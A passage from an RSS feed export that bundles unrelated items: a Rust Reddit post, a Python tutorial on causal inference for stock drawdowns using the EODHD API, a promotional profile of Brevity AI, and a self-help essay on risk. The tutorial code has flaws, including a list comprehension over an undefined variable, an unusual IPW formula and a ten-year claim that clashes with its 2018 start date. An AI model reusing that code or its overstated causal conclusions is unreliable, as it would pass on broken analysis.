see.]]></content:encoded></item><item><title>Things I miss in Rust</title><link>https://www.reddit.com/r/rust/comments/1qmu3m6/things_i_miss_in_rust/</link><author>/u/OneWilling1</author><category>rust</category><category>reddit</category><pubDate>Sun, 25 Jan 2026 20:17:26 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=3">Reddit - Rust</source><content:encoded><![CDATA[Since most of my previous work was in C++ and C#, I sometimes catch myself missing certain OO features, especially:inheritance ( 😁)One thing that comes up a lot for me is constructors.

Yet these numbers are only outcomes. They tell us how much pain existed, not why it happened.Sometimes a high P/E stock crashes harder. Sometimes a low-margin business stays resilient. Correlation alone can’t answer what actually  those reactions. That’s where most models stop, and where this story begins.This experiment tries to answer one deceptively simple question:Do fundamentals and market traits directly cause deeper drawdowns, or do they just move in sync with them?To find out, I built a causal AI framework that analyzes how valuation, volatility, and profitability affect a stock’s downside. The data comes from , covering ten years of S&P 500 stocks, which is more than enough to see how company characteristics shape real risk, not just statistical noise.The goal isn’t to forecast crashes or design a trading signal. It’s to understand what truly makes a portfolio fragile, and how causal inference can separate reason from coincidence.From Correlation to CausationIt’s easy to assume that if two things move together, one must cause the other.High valuations, rising volatility, falling prices; the patterns often look convincing enough. I used to take those relationships at face value until I realized that correlation is mostly storytelling. It looks logical, it feels logical, but it rarely holds up when conditions change.That’s where causal inference comes in.Instead of asking what usually happens together, it asks what would have happened if something were different.For instance, if two companies were identical except for their valuation, would the higher-valued one experience a deeper drawdown? That’s the kind of “what-if” question correlation can’t answer, but causal models can.In this study, I treated valuation, volatility, and profitability as the key “treatments.” The idea was to see how each factor, when changed, affects a company’s downside risk while holding everything else constant. It’s less about prediction and more about simulation, i.e., building alternate realities to see which traits consistently lead to more pain.I used  to make this possible: ten years of S&P 500 history, packed with price, volume, and fundamental data. The quality and consistency of that feed made it possible to treat this like a real-world experiment instead of just another backtest.The Setup: Getting the Data RightBefore getting into the causal analysis, I needed a proper foundation, which is clean, consistent data. Everything starts here.I first imported the essential packages. Nothing fancy, just what’s needed to pull data, shape it, and run the models later.import pandas as pd
import numpy as np
import requests
import time
from datetime import datetime, timedelta
from sklearn.linear_model import LogisticRegression
from sklearn.ensemble import RandomForestRegressor, RandomForestClassifier
import matplotlib.pyplot as plt
This covers the basics: pandas and numpy for handling data, requests for API calls, sklearn for causal modeling, and matplotlib for plotting.Config and Extracting TickersNext, I configured the API and built a small universe of S&P 500 tickers. Instead of manually typing them out, I pulled the current list directly from the .api_key = 'YOUR EODHD API KEY'
base_url = 'https://eodhd.com/api'

tickers_url = f'{base_url}/fundamentals/GSPC.INDX?api_token={api_key}&fmt=json'
tickers_raw = requests.get(tickers_url).json()
tickers = list(pd.DataFrame(tickers_raw['Components']).T['Code'])
tickers = [item + '.US' for item in t]

start_date = '2018-01-01'
end_date   = datetime.today().strftime('%Y-%m-%d')
EODHD’s /fundamentals/GSPC.INDX endpoint provides the full list of S&P 500 constituents. By appending .US to each code, I ensured compatibility with the /eod/ endpoint for fetching daily prices.Once the tickers were ready, I moved on to fetching price data and calculating returns.The function below retrieves daily OHLC values using  for each symbol between the start and end date, then stitches everything together. \n def fetch_eod_prices(ticker, start, end):
    url = f'{base_url}/eod/{ticker}?from={start}&to={end}&api_token={api_key}&fmt=json'
    r = requests.get(url).json()

    if not isinstance(r, list) or not r:
        return pd.DataFrame(columns=['date','close','ticker'])

    df = pd.DataFrame(r)[['date','close']]
    df['ticker'] = ticker

    print(f'{ticker} FETCHED DATA')
    time.sleep(1)

    return df

frames = [fetch_eod_prices(t, start_date, end_date) for t in tickers]

prices_df = pd.concat(frames, ignore_index=True).dropna(subset=['close'])

prices_df['date'] = pd.to_datetime(prices_df['date'])
prices_df = prices_df.sort_values(['ticker','date'])
prices_df['ret'] = prices_df.groupby('ticker')['close'].pct_change().fillna(0.0)
prices_df = prices_df[['ticker','date','close','ret']]

prices_df = prices_df.reset_index(drop=True)
prices_df
This creates a unified dataset of over a million rows across all S&P 500 tickers, each with the closing price and daily return. This is how the final dataframe looks like:The output confirms everything is aligned:Each ticker is ordered by date.The first row per ticker shows a return of zero (which validates the group logic).The data is dense, balanced, and ready for feature engineering in the next step.Measuring Stress: Calculating DrawdownsOnce the return data was ready, I needed to turn it into something that represents risk.Returns tell how a stock moved, but not how it behaved under pressure. Drawdown captures exactly that, which is how deep a stock fell from its recent peak during stress.For this, I defined two major market stress windows:COVID crash (Feb–Apr 2020)Rate-hike shock (Aug–Oct 2022)Each window captures a different macro shock, one liquidity-driven, the other inflation-driven. This gives a good contrast for causal inference later.def max_drawdown(series: pd.Series) -> float:
    cummax = series.cummax()
    dd = series / cummax - 1.0
    return float(dd.min())

stress_windows = [
    ('2020-02-15', '2020-04-30'), 
    ('2022-08-01', '2022-10-31')
]

rows = []
for t in prices_df['ticker'].unique():
    df_t = prices_df.loc[prices_df['ticker'] == t, ['date','close']].set_index('date').sort_index()
    for i, (start, end) in enumerate(stress_windows, start=1):
        s = df_t.loc[start:end, 'close']
        if s.empty:
            continue
        rows.append({
            'ticker': t,
            'window_id': i,
            'start': start,
            'end': end,
            'max_dd': max_drawdown(s)
        })

drawdowns_df = pd.DataFrame(rows)
drawdowns_df
The max_drawdown() function tracks the running peak of a stock’s price and measures the percentage drop from that peak.Then, for each ticker, I extract prices within the defined stress windows and compute the worst drawdown in that range.By iterating through two different market crises, the result shows how each company handled external shocks.Each stock now has up to two entries, one per stress event, along with its corresponding maximum drawdown.Fetching Fundamentals & Defining TreatmentsWith the price and drawdown data ready, the next step was to define the “treatments.”In causal inference, a treatment represents an event or characteristic whose effect we want to measure. Here, I wanted to understand how certain financial traits, like valuation, volatility, and profitability, affect a company’s risk profile during market stress.The three treatments I picked were:: stocks that are priced expensively relative to their earnings.: stocks that move aggressively with the market.: stocks with thinner profitability cushions.To build these, I used EODHD’s Fundamentals API, which provides all the key metrics I needed.Fetching Fundamentals Datadef fetch_fundamentals(ticker):
    url = f'{base_url}/fundamentals/{ticker}?api_token={api_key}&fmt=json'
    r = requests.get(url).json()
    if not isinstance(r, dict):
        return pd.DataFrame()

    data = r.get('Highlights', {})
    general = r.get('General', {})
    val = r.get('Valuation', {})

    row = {
        'ticker': ticker,
        'sector': general.get('Sector', np.nan),
        'market_cap': data.get('MarketCapitalization', np.nan),
        'beta': r.get('Technicals')['Beta'],
        'eps': data.get('EarningsShare', np.nan),
        'div_yield': data.get('DividendYield', np.nan),
        'net_margin': data.get('ProfitMargin', np.nan),
        'pe_ratio': val.get('TrailingPE'),
        'pb_ratio': val.get('PriceBookMRQ'),
    }

    print(f'{ticker} FETCHED DATA')
    time.sleep(1)

    return pd.DataFrame([row])

fund_frames = [fetch_fundamentals(t) for t in tickers]
fundamentals_df = pd.concat(fund_frames, ignore_index=True)

num_cols = ['market_cap','beta','eps','div_yield','net_margin','pe_ratio','pb_ratio']
fundamentals_df[num_cols] = fundamentals_df[num_cols].apply(pd.to_numeric, errors='coerce')

fundamentals_df
Each call to /fundamentals/{ticker} returns multiple nested blocks: General, Highlights, Valuation, and Technicals. I extracted what I needed from each:Highlights: Earnings per share, profit margin, dividend yield, market capValuation: PE and PB ratiosAll fields are converted into a single flat record per ticker and combined into one large DataFrame.The structure is wide enough to hold all core features and still compact enough to merge easily with returns later.Merging data and creating treatmentsThis step creates the dataset used for causal inference, combining financial performance with firm-level traits. \n # merge fundamentals with drawdowns per ticker-window
combined_df = drawdowns_df.merge(fundamentals_df, on='ticker', how='left')

# basic controls
combined_df['log_mcap'] = np.log(combined_df['market_cap'].replace({0: np.nan}))
combined_df['sector'] = combined_df['sector'].fillna('Unknown')

combined_df.head()
Each row here represents a stock-window pair: its drawdown during a specific stress period, valuation profile, and sector context.Log-transforming market cap helps stabilize the data since firm sizes vary wildly, while sector labels later help balance comparisons.With the merged dataset ready, I defined what qualifies as “treated.” For example, a stock is treated for a high PE if it falls above the 70th percentile PE within its own sector. That ensures comparisons happen within similar industries instead of globally. \n def sector_pe_thresholds(df, min_count=5, q=0.70):
    th = df.groupby('sector')['pe_ratio'].quantile(q).rename('pe_thr').to_dict()
    global_thr = df['pe_ratio'].quantile(q)
    return {s: (thr if not np.isnan(thr) else global_thr) for s, thr in th.items()}

pe_thr_map = sector_pe_thresholds(fundamentals_df)

combined_df['high_pe'] = combined_df.apply(
    lambda r: 1 if pd.notna(r['pe_ratio']) and r['pe_ratio'] > pe_thr_map.get(r['sector'], np.nan) else 0, axis=1
)

combined_df['high_beta'] = (combined_df['beta'] > 1.2).astype(int) # market sensitivity proxy
combined_df['low_margin'] = (combined_df['net_margin'] < 0).astype(int) # weak profitability

treat_cols = ['high_pe', 'high_beta', 'low_margin']
ctrl_cols = ['log_mcap', 'sector']
model_df = combined_df[['ticker','window_id','start','end','max_dd','pe_ratio','beta','net_margin','market_cap'] + treat_cols + ctrl_cols].copy()

model_df.head(10)
The logic is simple but deliberate: stocks represent overvalued firms within each sector. stocks are those that move more than 20% above market sensitivity. stocks reflect profitability risk.The resulting dataset looks like this:Each stock now carries its drawdown, financial metrics, and binary treatment flags. We have exactly what’s needed for causal analysis in the next section.Estimating Causal EffectsWith all the inputs ready, drawdowns, fundamentals, and treatment flags, it was time to move beyond correlations and actually test for causation.The question was straightforward:How much more (or less) do high-PE, high-beta, and low-margin stocks fall during market stress after accounting for factors like size and sector?That’s a classic causal inference problem. Instead of using traditional regressions, I decided to rely on two modern estimators:Inverse Probability Weighting (IPW) reweights observations to mimic a randomized experiment.Doubly Robust (DR) Estimator combines regression and reweighting to reduce bias.Implementing the EstimatorsThe first function computes the IPW estimate. It fits a logistic model to estimate the propensity score, which is the probability of being “treated” (for example, being a high-PE stock) given the controls.Then it adjusts the sample weights to make the treated and control groups comparable.The second function goes a step further by combining a regression model with weighting to create a doubly robust estimate. Even if one of the models is slightly misspecified, the results tend to remain stable.def causal_ipw(data, treatment, outcome, controls):
    df = data.dropna(subset=[treatment, outcome] + controls).copy()
    X = pd.get_dummies(df[controls], drop_first=True)
    T = df[treatment]
    y = df[outcome]

    # propensity score model
    ps_model = LogisticRegression(max_iter=500)
    ps_model.fit(X, T)
    p = ps_model.predict_proba(X)[:,1].clip(0.01, 0.99)

    # inverse weighting
    weights = T/p + (1-T)/(1-p)
    ate = np.mean(weights * (T - p) * y) / np.mean(weights * (T - p)**2)

    return ate

def causal_dr(data, treatment, outcome, controls):
    df = data.dropna(subset=[treatment, outcome] + controls).copy()
    X = pd.get_dummies(df[controls], drop_first=True)
    T = df[treatment].values
    y = df[outcome].values

    # models
    m_y = RandomForestRegressor(n_estimators=200, random_state=42)
    m_t = LogisticRegression(max_iter=500)

    m_y.fit(np.column_stack([X, T]), y)
    m_t.fit(X, T)
    p = m_t.predict_proba(X)[:,1].clip(0.01,0.99)
    y_hat_1 = m_y.predict(np.column_stack([X, np.ones(len(X))]))
    y_hat_0 = m_y.predict(np.column_stack([X, np.zeros(len(X))]))

    dr_scores = (T*(y - y_hat_1)/p) - ((1-T)*(y - y_hat_0)/(1-p)) + (y_hat_1 - y_hat_0)
    ate = np.mean(dr_scores)
    return ate

results = []
for t in ['high_pe','high_beta','low_margin']:
    ate_ipw = causal_ipw(model_df, t, 'max_dd', ['log_mcap','sector'])
    ate_dr = causal_dr(model_df, t, 'max_dd', ['log_mcap','sector'])
    results.append({'treatment': t, 'ate_ipw': ate_ipw, 'ate_dr': ate_dr})

effects_df = pd.DataFrame(results)
effects_df
This table is where things start getting interesting.Each row represents one treatment, and the two columns (atedr) show how that characteristic influences the maximum drawdown on average. tend to fall about 0.21 more (IPW) during stress periods. The DR estimator shows a smaller effect, but the direction is consistent. Overvalued stocks feel the heat first. show a 0.25 deeper drawdown, which is not surprising. They amplify market moves both ways. are hit the hardest, with nearly 0.37 additional downside. This suggests that profitability cushions truly help during panic phases.While the magnitudes differ slightly across estimators, the pattern is clear. Fragile fundamentals amplify stress.And that’s exactly the kind of causal evidence I wanted to see. Not just which stocks correlate with volatility, but which ones actually cause higher risk exposure when the market turns.Visualizing and Validating the EffectsOnce I had the causal estimates, I wanted to see what they actually looked like. Numbers can tell you the “what,” but visuals often reveal the “how.”At this point, the objective wasn’t to add more math, but to see whether the intuition from the earlier steps holds up when plotted.This stage also acts as a sanity check. If the visual patterns contradict the statistical results, something’s usually off in the setup. But if both align, you can be more confident that the model’s logic is sound.Plotting the Causal EffectsThe first visualization compares the estimated effects from the two causal models, IPW and DR.This helps check whether both estimators point in the same direction and how strongly each treatment affects the drawdown. \n effects_plot = effects_df.melt(id_vars='treatment', value_vars=['ate_ipw','ate_dr'], var_name='method', value_name='ate')

plt.figure(figsize=(6,4))
for m in effects_plot['method'].unique():
    subset = effects_plot[effects_plot['method']==m]
    plt.bar(subset['treatment'], subset['ate'], alpha=0.7, label=m)

plt.axhline(0, color='black', linewidth=0.8)
plt.ylabel('Estimated Causal Effect on Max Drawdown')
plt.title('Causal Effect Estimates (IPW vs DR)')
plt.legend()
plt.tight_layout()
plt.show()
The bar chart above captures the story behind all those computations.Each bar represents the estimated causal effect of a financial trait on maximum drawdown.Across the three treatments, the trend is consistent. High PE, high beta, and low margin all deepen downside risk, with low-margin stocks showing the sharpest impact.The difference between the blue and orange bars (IPW and DR) is minor, which is exactly what you want to see. It means both models are converging toward the same conclusion.The takeaway is clear: fundamental fragility doesn’t just coincide with volatility. It drives it.Checking Overlap Between Treated and Control GroupsBefore trusting any causal estimate, it’s essential to check whether the treated and control samples are comparable.In theory, causal inference assumes overlap, meaning every treated stock has a comparable control stock with similar characteristics, except for the treatment itself.If there’s no overlap, the results become meaningless because we’re comparing two entirely different worlds.Propensity Score DistributionTo test this, I plotted the propensity scores for each treatment.The score represents the probability of a stock being “treated” (for instance, having a high PE ratio) given its market cap and sector. \n for t in ['high_pe','high_beta','low_margin']:
    df = model_df.dropna(subset=[t,'log_mcap','sector']).copy()
    X = pd.get_dummies(df[['log_mcap','sector']], drop_first=True)
    T = df[t]

    ps_model = LogisticRegression(max_iter=500)
    ps_model.fit(X, T)
    ps = ps_model.predict_proba(X)[:,1]

    plt.figure(figsize=(6,4))
    plt.hist(ps[T==1], bins=20, alpha=0.6, label='treated', color='tab:blue')
    plt.hist(ps[T==0], bins=20, alpha=0.6, label='control', color='tab:orange')
    plt.title(f'Propensity Score Overlap — {t}')
    plt.xlabel('propensity score')
    plt.ylabel('count')
    plt.legend()
    plt.tight_layout()
    plt.show()
The histograms above show how well the model managed to balance the treated and control groups across the three traits.For  stocks, there’s a healthy overlap between blue and orange bars, which means the weighting process has done its job fairly well.For , the distributions are more scattered, hinting that these stocks behave differently enough to make perfect matching difficult. companies show the least overlap, which is expected since unprofitable firms often cluster in specific sectors like biotech or early-stage tech.While the overlaps aren’t perfect, they’re sufficient to move forward. The key point is that there’s enough shared ground between treated and control groups to make causal comparison meaningful.Verifying Covariate BalanceEven though the visual overlaps looked decent, I wanted a numerical check to confirm that the weighting step did what it was supposed to.The idea is simple: after reweighting, the treated and control groups should look nearly identical in their key characteristics, except for the treatment itself.To test this, I compared the mean difference in log market capitalization between high-beta stocks and their controls, both before and after weighting.t = 'high_beta'
df = model_df.dropna(subset=[t,'log_mcap','sector']).copy()
X = pd.get_dummies(df[['log_mcap','sector']], drop_first=True)
T = df[t]

ps_model = LogisticRegression(max_iter=500)
ps_model.fit(X, T)
ps = ps_model.predict_proba(X)[:,1]
w = T/ps + (1-T)/(1-ps)

m_treat_raw = df.loc[T==1,'log_mcap'].mean()
m_ctrl_raw = df.loc[T==0,'log_mcap'].mean()
m_treat_w = np.average(df['log_mcap'], weights=T*w)
m_ctrl_w = np.average(df['log_mcap'], weights=(1-T)*w)

print('Covariate balance for log_mcap (high_beta)')
print(f'Raw diff: {m_treat_raw - m_ctrl_raw:.4f}')
print(f'Weighted diff: {m_treat_w - m_ctrl_w:.4f}')
Before weighting, the average difference in log market cap between high-beta and low-beta stocks was around 0.19, which means the two groups weren’t perfectly comparable.After applying the weights, that difference dropped to 0.0008 (nearly zero).This confirms that the balancing process worked as intended. By reweighting observations according to their propensity scores, the treated and control groups now share almost identical distributions in their control variables.That alignment is what gives the causal estimates credibility. Without it, we would simply be comparing random subsets of the market instead of isolating the effect of specific traits like valuation, volatility, or profitability.What This Means for Risk ManagementAfter spending hours inside Python, it’s easy to forget what this all connects to, which is the real market. The value of causal modeling is that it reframes how we think about risk. Instead of assuming or guessing which factors drive volatility, it gives us a measurable way to quantify how much each one truly contributes.In traditional analysis, drawdowns are treated as outcomes of randomness or sentiment. But once we look through a causal lens, the randomness begins to fade. We start to see structure and the patterns that repeat when certain traits combine.A portfolio manager can use this insight to design more resilient allocations. For instance, if low-margin firms consistently amplify downside during stress windows, those positions can be hedged or sized down ahead of similar conditions. If high-beta stocks display asymmetric losses even after accounting for size and sector, then they deserve a risk premium or tighter stop rules.The same principle applies to stress testing.Rather than simulating arbitrary shocks, we can construct counterfactual scenarios:What would have happened if the portfolio held fewer high-PE names during a sell-off?How much of the observed risk was structural, and how much was avoidable?Causal models turn these questions into measurable answers. They allow risk managers to move from intuition to evidence, from correlation to attribution.This entire workflow, from raw data to counterfactual reasoning, was never meant to predict the next crash or rally.It was meant to understand why portfolios behave the way they do when markets turn unstable.By combining fundamental traits, stress windows, and causal estimators, we built a framework that explains structural drivers of risk rather than chasing signals.Each piece of code served a purpose: defining clean treatments, balancing controls, estimating effects, and validating the logic through overlap and weighting.Causal inference will not replace forecasting or technical analysis. But it adds a new dimension. The one focused on understanding rather than prediction. When markets fall, it helps separate what was inevitable from what was amplified by exposure to specific traits.Markets don’t just move randomly. They react to structure, and causal AI helps us see that structure clearly.]]></content:encoded></item><item><title>PDF Made Easy: Gopdfsuit v4.0.0 is Here (Digital Signatures, PDF/A-4, and More!)</title><link>https://chinmay-sawant.github.io/gopdfsuit</link><author>/u/chinmay06</author><category>golang</category><category>reddit</category><pubDate>Sun, 25 Jan 2026 20:11:37 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[We just dropped , and it’s a massive leap forward.

Brevity AI, Inc. has developed a groundbreaking clinical documentation platform that transforms how healthcare professionals interact with patient data, compressing hours of preparation and documentation into minutes via Artificial Intelligence. As Co-Founder and CTO, Purv Rakeshkumar Chauhan designed and implemented the entire software architecture, demonstrating exceptional software engineering capabilities by building a production-grade healthcare system from concept to reality.The Brevity AI platform represents a sophisticated technical achievement requiring mastery across the entire software development lifecycle. Purv independently architected and developed the complete system, from initial requirements analysis through production deployment and ongoing maintenance. This comprehensive technical ownership encompasses frontend user interfaces optimized for clinical workflows, backend services processing massive medical datasets, AI/ML pipeline integration for intelligent document analysis, and secure data infrastructure managing sensitive healthcare information.\
The platform's architecture solves a complex technical challenge: processing hundreds of pages of unstructured medical records in real-time while maintaining HIPAA compliance and clinical accuracy. This necessitated designing scalable data processing pipelines capable of ingesting diverse medical document formats, implementing natural language processing workflows that extract clinically relevant information with precision, and creating intuitive user interfaces that seamlessly integrate into existing clinical workflows. Each architectural decision reflects careful consideration of healthcare's unique technical constraints—from latency requirements for real-time transcription to data residency requirements for patient privacy.Advanced System Architecture: Building for Healthcare ScaleThe technical architecture of Brevity AI demonstrates sophisticated software engineering principles applied to healthcare's demanding requirements. The system implements a microservices-based architecture that enables independent scaling of compute-intensive AI processing, document parsing, and real-time transcription services. This modular design allows the platform to handle variable workloads—from processing extensive patient histories during visit preparation to managing real-time documentation during patient encounters—without performance degradation.\
Purv's implementation includes advanced caching strategies that optimize response times for frequently accessed patient data, asynchronous processing queues that manage resource-intensive document analysis tasks, and intelligent load balancing that ensures consistent performance across clinical environments. The platform's data layer employs optimized database schemas specifically designed for medical record structures, enabling sub-second query performance even when analyzing patient histories spanning decades with hundreds of documents.Real-Time AI Integration: Technical Innovation in Clinical DocumentationThe platform's real-time documentation capabilities showcase sophisticated software engineering in AI integration. Purv architected a speech-to-text pipeline for recognizing medical terminology in clinical conversations. This system processes audio streams in real-time, implementing advanced noise reduction algorithms that filter ambient noise in clinical environments while preserving conversational clarity.\
The AI-powered note generation system represents particularly complex technical work—transforming unstructured conversations into structured clinical notes requires sophisticated natural language understanding, medical entity recognition, and template generation algorithms. Purv designed this pipeline to process extended patient conversations (often 20-30 minutes) and generate concise, standards-compliant clinical notes within seconds after the conversation concludes. The system employs intelligent chunking strategies to manage long conversations, contextual analysis to maintain clinical coherence across conversation segments, and validation algorithms ensuring generated notes meet documentation standards.The platform's visit preparation capabilities solve one of healthcare's most time-consuming challenges through advanced document processing architecture. By analyzing a patient's complete medical history—often 300+ pages spanning multiple healthcare systems—the system extracts clinically relevant information, identifies key medical conditions and trends, synthesizes laboratory results across different formats, and presents findings in a clinically useful format.\
Purv engineered a multi-stage processing pipeline that handles this complexity: document ingestion and format normalization for diverse medical record types, intelligent page analysis using computer vision to identify document types, natural language extraction of clinical entities and relationships, temporal analysis to track condition progression and treatment outcomes, and intelligent summarization that prioritizes information by clinical relevance. This pipeline processes massive document sets in minutes, a task that traditionally requires hours of manual review.While Purv's cybersecurity background provides foundational expertise, the platform's security implementation demonstrates how security principles translate into practical software architecture. Rather than treating security as an afterthought, the system implements security-by-design principles throughout the technical stack. This includes implementing a Zero Trust Architecture requiring authentication and authorization at every system boundary, designing data encryption protocols for data at rest and in transit, architecting audit logging systems that track all data access for compliance reporting, and building automated security testing into the continuous integration pipeline.\
The HIPAA compliance framework extends beyond security to encompass comprehensive technical controls: data retention policies enforced through automated lifecycle management, access control mechanisms with role-based permissions at granular levels, and automated compliance reporting systems that generate audit trails for regulatory review. These technical implementations ensure the platform meets healthcare's stringent regulatory requirements while maintaining the performance necessary for clinical workflows.The platform's technical sophistication translates directly into measurable healthcare improvements. Reducing visit preparation time from hours to minutes demonstrates the document processing pipeline's efficiency. The elimination of after-hours documentation through real-time transcription showcases the speech processing system's accuracy and reliability. Improved clinical accuracy from AI-assisted summarization validates the natural language processing algorithms' effectiveness. These outcomes reflect successful software engineering—building systems that solve real problems through technical excellence.Purv's responsibilities encompass the entire development process—defining technical requirements through collaboration with clinicians, designing system architecture and selecting appropriate technology stacks, implementing features through hands-on software development, conducting comprehensive testing including unit, integration, and end-to-end validation, managing production deployment and monitoring system performance, and iterating based on user feedback and performance metrics. This comprehensive technical ownership ensures cohesive architecture where every component serves the platform's clinical mission.Technical Foundation Enabling Healthcare InnovationBrevity AI's platform represents a significant software engineering achievement—a production-grade healthcare system built through exceptional architectural design and development expertise.

Clary</author><category>tech</category><pubDate>Sun, 25 Jan 2026 19:56:27 +0000</pubDate><source url="https://hackernoon.com/">Tech - HackerNoon</source><content:encoded><![CDATA[You’re not risk-averse. You’re math-averse.The reason you haven’t started that business, published that work, or made that career move isn’t because you’re scared. It’s because you’re running the wrong calculation.Most people think about risk like accountants. They see a potential move - start a podcast, launch a product, quit their job - and immediately calculate what they could lose.Time. Money. Reputation. Stability.The numbers add up to “too risky.”They stay in jobs they’ve outgrown. They sit on ideas that could change their lives. They watch other people - often less talented, less prepared people - build the things they dreamed about building.And they tell themselves they’re being smart. Being prudent. Being realistic.But here’s what nobody tells you: the math you’re using to justify staying stuck is fundamentally wrong.You’re optimizing for the wrong variable. You’re calculating downside while ignoring asymmetry. You’re treating all risks as equal when they’re not even in the same universe.And that miscalculation is costing you everything.This isn’t one of those letters about “following your dreams” or “just believe in yourself.”This is about the actual mathematics of asymmetric upside. Why the downside of trying and failing is almost always survivable. Why the downside of never trying is guaranteed regret. And why betting on yourself has a higher expected value than you think.I - The Risk Calculation That Keeps Smart People StuckI spent two years hesitating on my podcast.I knew I wanted to do it. I had the ideas. I knew what I would talk about. I’d written out episode concepts. I’d even recorded test episodes that nobody would ever hear.But I kept finding reasons not to launch.“I need better equipment first.” “I should have more of a following before I start.” “I need to be more of an expert in my topics.” “I should wait until I have a clear monetization strategy.”Every reason sounded rational. Every excuse felt legitimate.And I was very good at performing preparation. I researched microphones for weeks. I studied successful podcast formats. I planned out 20 episodes in detail. I told people at parties “I’m thinking about starting a podcast” and enjoyed the validation of being someone with ambitious plans.But preparation became my drug of choice. The dopamine hit of planning without the risk of failing.You know exactly what I’m talking about. Because you do this too.You’ve been “thinking about” starting that thing for how long now? Six months? Two years?You have the Notion doc with the perfect structure. The bookmarks folder labeled “Research.” The screenshot folder of inspiration. Maybe you’ve even bought a course or two. Told yourself you’re building a foundation.But here’s what was actually happening in my brain - and yours:My brain was running a calculation.“What if I invest six months and it doesn’t work?” “What if I look stupid?” “What if I fail and prove I’m not capable?” “What if I lose the money on equipment?”The potential losses felt massive. Concrete. The potential gains felt distant. Uncertain. Unlikely.So I waited. I told myself I needed more preparation, more certainty, more proof that it would work.What I didn’t realize then - but understand clearly now - is that I wasn’t being careful. I was being mathematically illiterate.Because the calculation I was running - “What could I lose?” - is only half the equation.The complete equation is: “What could I lose?” versus “What could I gain?” versus “What’s the probability of each outcome?” versus “What’s the cost of never finding out?”And when you run the complete calculation, the math changes entirely.You want to know what actually happened when I finally launched the podcast?Nothing catastrophic. No embarrassment. No public failure.I published the first episode. Twenty-three people listened in the first week. Most of them were friends. The audio quality was mediocre. I stumbled over words. I said “um” too much.No one mocked me. No one called me out for not being an expert. The world didn’t end.Within three months, I had 200 regular listeners. Within six months, one of those listeners introduced me to someone who became a client. Within a year, the podcast became a primary way I connected with my audience and developed ideas that became newsletter content.All of the disaster scenarios I’d imagined for two years? None of them happened.The worst case was so much less bad than I’d feared. The upside was so much better than I’d imagined.That’s the pattern. The fear is always worse than the reality.Let me show you with real numbers. (same principle applies to podcasts, YouTube, any content):You invest 3-6 months writing consistently. Maybe 100 hours total over that period. That’s about 30 minutes per day, 5 days a week.You promote it to your existing network and on social platforms.Nobody reads it. Your first few posts get 3 views. Your mom and your two best friends.You feel embarrassed. You imagine people seeing you try and fail. You experience the discomfort of being visible while not being validated.That’s the downside. Let’s assess: Is it survivable?You’re out 100 hours spread over six months. In exchange for those hours, you:Developed clarity on what you think about important topicsBuilt a skill (writing for an audience)Created a portfolio of work that demonstrates your thinkingLearned what doesn’t resonate (valuable market research)Proved to yourself that you can finish what you startMade progress while others stayed stuck in planning modeYour ego takes a hit for maybe a week. Then life moves on. Nobody actually cares that much. Everyone’s too busy thinking about their own lives.Now let’s say it works. Not perfectly. Not viral-level success. Just… it works.The newsletter connects with 1,000 people over a year. That’s less than 3 new subscribers per day. Completely achievable.Those 1,000 people care about what you think. They read what you write. They respond with their own thoughts. They remember your name.That audience of 1,000 becomes:A distribution channel for anything you want to createA testing ground for new ideas and productsA network of people who can introduce you to opportunitiesSocial proof that you can build something from scratchA source of income if you ever want to monetizeConversations you couldn’t have had otherwiseRelationships that wouldn’t have formedOne of those 1,000 people sends your newsletter to someone influential in your field. That person reaches out. One conversation leads to an opportunity you never would have encountered.Or: Ten of those 1,000 people buy a product you create. $100 each. That’s $1,000. For a first attempt at monetization. Which validates that you can create value people will pay for. Which gives you confidence to build more.Or: Your writing clarifies your thinking so much that you become better at your day job. You get promoted. The writing skills transfer. The audience gives you leverage.These aren’t hypotheticals. This is the actual, documented pattern that happens to people who start creating and stick with it.But here’s what nobody tells you about the year you spend “preparing” instead of starting:You don’t spend that year in neutral. You spend it moving backwards.Every month you wait to start, someone else publishes their first post. Someone else sends their first email. Someone else builds their first 10 subscribers.You’re not standing still while you prepare. You’re watching a gap open up between you and the people who started before they felt ready.And that gap isn’t just about audience size. It’s about confidence, skill, resilience, and the compounding knowledge that comes from actually doing the thing.By the time you finally start - if you ever do - you’re not competing with who you are now. You’re competing with a version of yourself who started a year ago and has been improving ever since.Same effort. Same time investment. But the upside and downside aren’t even in the same galaxy.The downside is capped (100 hours of learning, temporary ego hit, valuable skills developed). The upside is uncapped (career transformation, financial freedom, opportunities you can’t predict).Most of the bets you’re not taking have a capped, survivable downside and an uncapped, transformative upside.That’s not risk in the traditional sense. That’s asymmetry. And asymmetry is mathematically smart.Yet smart people don’t take these bets.Why? Because they’re running the wrong calculation.They see the downside clearly - the time, the money, the potential embarrassment.They discount the upside heavily - “That probably won’t happen to me.”And they completely ignore the fourth variable: the cost of never trying.Here’s what the miscalculation reveals: You’re not actually trying to make a smart decision. You’re trying to find a reason to stay comfortable.The math is just cover. The spreadsheet is just permission to avoid risk while feeling rational about it.If you actually cared about making the optimal choice, you’d run the complete equation. You’d see the asymmetry. You’d move.But you don’t want to see it. Because seeing it would mean you have no more excuses.So why does your brain work this way? Why do smart people systematically miscalculate risk?Because your brain isn’t running math. It’s running something far more primitive.II - Why Your Brain Gets The Math Wrong“We suffer more often in imagination than in reality.”Your brain isn’t doing math. It’s running ancient survival software that was calibrated for a world that no longer exists.The Mismatch Between Ancestral Risk and Modern OpportunityTen thousand years ago, risk assessment was brutally simple:Will this kill me? Yes or no.Trying a new hunting ground: Might encounter predators. Risk of death: High.Challenging the tribe leader for status: Might get exiled or killed. Risk of death: High.Eating unknown berries: Might be poisonous. Risk of death: High.In that environment, loss aversion made perfect evolutionary sense.The cost of being wrong  was death. The benefit of being right ten times was… not being dead.Natural selection strongly favored caution. The humans who took too many risks didn’t survive to pass on their genes. The ones who avoided uncertainty, who stuck with what was known and safe, lived long enough to reproduce.Your brain is descended from those cautious survivors. It’s running their software. And that software has one primary directive: avoid anything that feels like it might threaten your survival.Your amygdala - the almond-shaped cluster of neurons responsible for processing threats - can’t tell the difference between “there’s a predator in the grass” and “someone might not like my business idea.”Both trigger the same neurological response. Both flood your system with the same stress hormones. Both generate the same behavioral impulse: avoid, retreat, stay safe.But the actual stakes are completely different.Starting a podcast won’t kill you. It can’t. The worst-case scenario is temporary embarrassment.Launching a product won’t exile you from the tribe. Modern society doesn’t work that way. The worst-case scenario is you learn what customers don’t want.Publishing your writing won’t poison you. It’s not possible. 